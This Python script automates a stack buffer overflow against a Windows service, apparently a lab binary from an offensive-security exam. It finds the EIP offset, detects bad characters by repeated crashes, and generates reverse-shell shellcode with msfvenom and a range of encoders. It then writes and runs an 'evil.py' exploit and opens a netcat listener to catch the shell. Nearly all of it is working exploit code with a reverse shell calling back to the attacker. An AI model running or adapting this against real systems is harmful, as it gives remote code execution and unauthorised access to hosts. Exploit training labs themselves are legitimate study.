#!/usr/bin/env python

"""
apt install -y zenity; killall -9 python; python abo_kali_2.py --kip 192.168.1.6 --wip 192.168.1.5 --aport 4455 --len 2500 --nops 10 --badcutoff 13 --command OVRFLW --exe "C:/Users/Root/Desktop/kali/exam/auto/exe/e2/offsec_pwk_srv.exe"
"""

import socket, sys, argparse, time, os, subprocess, random, string
from string import ascii_uppercase, ascii_lowercase, digits

def pattern_gen(length):
    pattern = ""
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                if len(pattern) < length:
                    pattern += upper + lower + digit
                else:
                    out = pattern[:length]
                    return out

parser = argparse.ArgumentParser()
parser.add_argument("--wip")
parser.add_argument("--aport", type = int)
parser.add_argument("--kip")
parser.add_argument("--exe")
parser.add_argument("--nops", type = int)
parser.add_argument("--command")
parser.add_argument("--len", type = int)
parser.add_argument("--badcutoff", type = int)
args = parser.parse_args()

print "\n\nHi from auto buffer overflow 2 (abo2)\n\n"
print "- Unselect termination warning : Options > Debugging options > Security > Warn when terminating active process\n"
print "- Make sure abo_win.py is running on target pc as admin\n"
sys.stdout.flush()

sw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sw.connect((args.wip, 54321))

sw.send(">" + args.exe)
sw.recv(1024)

print "\nSending pattern...\n"
sys.stdout.flush()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((args.wip, args.aport))
s.recv(1024)
s.send(args.command + " " + pattern_gen(args.len) + "\r\n")
s.close()

time.sleep(2)

print "Detecting eip offset, stack offset, best jmp esp address...\n"
sys.stdout.flush()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((args.wip, 8888))
s.send("!abo_imm2 1\n")
ress = s.recv(512)
res = ress.split(", ")
print "\t" + ress + "\n\n"
sys.stdout.flush()
s.close()

raw_input('jmp esp ve eip offset screenshot al kardejj, then enter');

didit = False
while not didit:

    bads = ""

    bok = False
    done = False
    while not done:

        sw.send("restart")
        sw.recv(1024)

        print "\nGenerating shell code...\n"
        sys.stdout.flush()

        print "msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=" + args.kip + " LPORT=" + "4444" + ' -b "' + bads + "\\x0a\\x0d" + '" -f python --smallest'
        sys.stdout.flush()
        bbuf = os.popen("msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=" + args.kip + " LPORT=" + "4444" + ' -b "' + bads + "\\x0a\\x0d" + '" -f python --smallest').read()
  
        if bbuf == "" or len(bbuf.replace('buf += "', "").replace('buf =  ""', "").replace('"', "").replace('\n', "").replace('\\x', "")) / 2 > (3000 - int(res[0]) - 4 - int(args.nops)):
            print "\nAuu, fallback, try all encoders...\n"
            sys.stdout.flush()
            bufs = []
            for mod in ["jmp_call_additive", "add_sub", "alpha_mixed", "alpha_upper", "avoid_underscore_tolower", "avoid_utf8_tolower", "bloxor", "bmp_polyglot", "call4_dword_xor", "context_cpuid", "context_stat", "context_time", "countdown", "fnstenv_mov", "nonalpha", "nonupper", "opt_sub", "service", "shikata_ga_nai", "single_static_bit", "unicode_mixed", "unicode_upper"]:
                print "msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=" + args.kip + " LPORT=" + "4444" + ' -b "' + bads + "\\x0a\\x0d" + '" -f python --smallest -e "x86/' + mod + '"'
                sys.stdout.flush()
                bufs.append(os.popen("msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=" + args.kip + " LPORT=" + "4444" + ' -b "' + bads + "\\x0a\\x0d" + '" -f python --smallest -e "x86/' + mod + '"').read())
                
                ttb = len(bufs[-1].replace('buf += "', "").replace('buf =  ""', "").replace('"', "").replace('\n', "").replace('\\x', "")) / 2
                if ttb > 10 and ttb < (3000 - int(res[0]) - 4 - int(args.nops)): break
            sbufs = sorted(bufs, key = len)
            bbuf = ""
            for c in sbufs:
                if len(c) > 10 and len(c.replace('buf += "', "").replace('buf =  ""', "").replace('"', "").replace('\n', "").replace('\\x', "")) / 2 < (3000 - int(res[0]) - 4 - int(args.nops)):
                    bbuf = c
                    break

            if len(bbuf) == 0:
                os.popen("zenity --notification --text 'Restart, no possible shell code'").read()
                print "\n\n\tNo possible shell code, start again\n\n"
                sys.stdout.flush()
                done = True
                bok = True

        bbuf = bbuf.replace('buf += "', "")
        bbuf = bbuf.replace('buf =  ""', "")
        bbuf = bbuf.replace('"', "")
        bbuf = bbuf.replace('\n', "")
        bbuf2 = bbuf.replace('\\x', "")

        exec('all = "' + bbuf + '"')
        chklen = len("A" * int(res[0]) + "BBBB" + "\x90" * int(args.nops) + all + "\x90" * (3000-int(res[0])-4-(len(bbuf2)/2)-int(args.nops)))

        if not bok and chklen == 3000:

            print "\n\n\tgo len: " + str(chklen) + "\n\n"
            sys.stdout.flush()

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((args.wip, args.aport))
            s.recv(1024)
            s.send(args.command + " " + "A" * int(res[0]) + "BBBB" + "\x90" * int(args.nops) + all + "\x90" * (3000-int(res[0])-4-(len(bbuf2)/2)-int(args.nops)) + "\r\n")
            s.close()

            time.sleep(2)

            print "Detecting bad chars...\n"
            sys.stdout.flush()

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((args.wip, 8888))
            s.send("!abo_imm2 2 " + str(int(args.nops) + (len(bbuf2)/2)) + " " + args.kip + "\n")
            s.close()

            rec = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            rec.bind(('', 9999))
            rec.listen(5)
            conn, addr = rec.accept()
            inc = ""
            while 1:
                data = conn.recv(1024)
                if not data: break
                inc += data
            conn.close()
            if inc == "Command Executed": inc = ""

            bbuf2 = int(args.nops) * "90" + bbuf2 

            print "\tinc: " + inc + "\n\n"
            sys.stdout.flush()
            print "\tbbuf2: " + bbuf2 + "\n\n"
            sys.stdout.flush()

            cbads = ""
            for i in xrange(0, len(bbuf2), 2):
                if bbuf2[i:i + 2] != inc[i:i + 2]:
                    cbads += "\\x" + bbuf2[i:i + 2]
                    break

            if len(cbads) == 0:
                done = True
                os.popen("zenity --notification --text 'Found all bads'").read()
            elif len(bads) > 4 * args.badcutoff:
                os.popen("zenity --notification --text 'Restart, too many bad chars'").read()
                print "\tGiving up, i.e. boku cikti\n\n"
                sys.stdout.flush()
                done = True
                bok = True
            else:
                bads += cbads
                print "\tcur bad: " + cbads + "\n\n"
                sys.stdout.flush()
                print "\tall bads: " + bads + "\n\n"
                os.popen("zenity --notification --text '#bad: " + str(len(bads)/4) + "'").read()
                sys.stdout.flush()
                raw_input('cur bad screenshot al kardejj tabii yerini bulabilirsen, then enter');

    if not bok:

        print "\n\n\tDone, all bads: " + bads + "\n\n"
        sys.stdout.flush()

        sw.send("restart")
        sw.recv(1024)

        print "\nGenerating shell code...\n"
        sys.stdout.flush()

        print "msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=" + args.kip + " LPORT=" + "4444" + ' -b "' + bads + "\\x0a\\x0d" + '" -f python --smallest'
        sys.stdout.flush()
        bbuf = os.popen("msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=" + args.kip + " LPORT=" + "4444" + ' -b "' + bads + "\\x0a\\x0d" + '" -f python --smallest').read()

        if bbuf == "" or len(bbuf.replace('buf += "', "").replace('buf =  ""', "").replace('"', "").replace('\n', "").replace('\\x', "")) / 2 > (3000 - int(res[0]) - 4 - int(args.nops)):
            print "\nAuu, fallback, try all encoders...\n"
            sys.stdout.flush()
            bufs = []
            for mod in ["jmp_call_additive", "add_sub", "alpha_mixed", "alpha_upper", "avoid_underscore_tolower", "avoid_utf8_tolower", "bloxor", "bmp_polyglot", "call4_dword_xor", "context_cpuid", "context_stat", "context_time", "countdown", "fnstenv_mov", "nonalpha", "nonupper", "opt_sub", "service", "shikata_ga_nai", "single_static_bit", "unicode_mixed", "unicode_upper"]:
                print "msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=" + args.kip + " LPORT=" + "4444" + ' -b "' + bads + "\\x0a\\x0d" + '" -f python --smallest -e "x86/' + mod + '"'
                sys.stdout.flush()
                bufs.append(os.popen("msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=" + args.kip + " LPORT=" + "4444" + ' -b "' + bads + "\\x0a\\x0d" + '" -f python --smallest -e "x86/' + mod + '"').read())
  
                ttb = len(bufs[-1].replace('buf += "', "").replace('buf =  ""', "").replace('"', "").replace('\n', "").replace('\\x', "")) / 2
                if ttb > 10 and ttb < (3000 - int(res[0]) - 4 - int(args.nops)): break
            sbufs = sorted(bufs, key = len)
            bbuf = ""
            for c in sbufs:
                if len(c) > 10 and len(c.replace('buf += "', "").replace('buf =  ""', "").replace('"', "").replace('\n', "").replace('\\x', "")) / 2 < (3000 - int(res[0]) - 4 - int(args.nops)):
                    bbuf = c
                    break

        exec(bbuf)
        hhhh = (3000-int(res[0])-4-len(buf)-int(args.nops))

        print "\nCreating evil.py...\n"
        sys.stdout.flush()
        file = open("evil.py", "w") 
        file.write("#!/usr/bin/env python\n")
        file.write("import socket\n")
        file.write(bbuf)

        file.write('#print len("A" * ' + res[0] + ' + "' + res[1] + '" + "\\x90" * ' + str(args.nops) + ' + buf' + ' + "\\x90" * ' + str(hhhh) + ")")
        file.write("\n")
        file.write("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
        file.write('s.connect(("' + args.wip + '", ' + str(args.aport) + "))\n")
        file.write("s.recv(1024)\n")
        
        file.write('s.send("' + args.command + ' " + "A" * ' + res[0] + ' + "' + res[1] + '" + "\\x90" * ' + str(args.nops) + ' + buf' + ' + "\\x90" * ' + str(hhhh) + ' + "\\r\\n")\n')
        file.write("s.close()\n")
        file.close()

        print "Executing evil script, now you should receive connection from target pc\n"
        os.popen("python evil.py")

        p = subprocess.Popen(['/bin/bash', '-c', '/bin/nc -lvp 4444'])

        time.sleep(5)

        if os.popen("netstat -nt | awk '{print $4}' | sed 's/^.*://' | grep '^4444$' | wc -l").read() == "0\n":
            print "\nWrong time slot, try harder, again...\n\n"
            os.popen("zenity --notification --text 'Trying harder'").read()
            p.kill()
        else:
            os.popen("zenity --notification --text BufSession").read()
            p.wait()
            sw.close()
            didit = True
